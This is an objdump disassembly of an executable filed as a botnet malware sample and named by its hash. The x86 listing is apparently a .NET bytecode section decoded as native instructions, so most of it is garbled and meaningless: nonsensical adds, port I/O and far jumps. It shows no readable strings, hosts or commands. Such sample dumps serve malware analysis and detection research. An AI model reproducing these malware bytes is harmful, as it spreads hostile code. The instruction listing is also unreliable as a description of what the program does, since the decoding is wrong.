
malware_samples/botnet/9c9e5be6e5556b7c01220256aa557e599c762aec1c79973d0f839608802751a8.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 d1                	add    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 d0                	add    %dl,%al
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
